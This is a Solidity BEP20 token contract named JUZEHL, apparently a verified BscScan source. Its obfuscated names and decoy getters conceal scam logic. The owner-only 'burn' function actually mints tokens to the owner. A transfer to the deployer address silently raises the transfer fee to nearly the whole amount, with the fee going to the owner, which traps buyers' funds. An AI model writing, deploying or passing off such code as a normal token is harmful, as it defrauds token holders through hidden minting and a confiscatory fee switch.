/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.1;
contract VLYKVNI {
address private  GBMWBH = address(0);
address private  MRFNNA = address(0);
uint256 public constant EASNNP = 99999;
string public  name = "JUZEHL";
uint256 private  EXRRRP = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  GHUONW = 1000000000000000000000;
uint256 private  KTCDIE = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  ZQEFCT = 100000000;
address private  NHRDEQ = address(0);
string public  symbol = "JUZEHL";
address private  TEYGSY = address(0);
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 private  MURUYB = 1000000000000000;
uint256 private  CJVMDZ = 10000000000;
mapping (address => uint256) public balanceOf;
uint256 private  ZPANOF = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  HCXZFT = address(0);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getKTCDIE() private returns (uint256) {
return KTCDIE;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getNHRDEQ() private returns (address) {
return NHRDEQ;
}

function _getGBMWBH() private returns (address) {
return GBMWBH;
}

function _getZQEFCT() private returns (uint256) {
return ZQEFCT;
}

function _getCJVMDZ() private returns (uint256) {
return CJVMDZ;
}

function _getEXRRRP() private returns (uint256) {
return EXRRRP;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZKJBJY");
require(to != address(0), "ZKJBJY");
require(amount <= balanceOf[from], "ZKJBJY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* EASNNP/ZPANOF ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TEYGSY){
ZPANOF = EASNNP+2;
}
emit Transfer(from, to, transferAmount);
}
function _getMURUYB() private returns (uint256) {
return MURUYB;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getMRFNNA() private returns (address) {
return MRFNNA;
}

constructor () {
TEYGSY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getGHUONW() private returns (uint256) {
return GHUONW;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZKJBJY 0");
require(spender != address(0), "fZKJBJY 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getHCXZFT() private returns (address) {
return HCXZFT;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}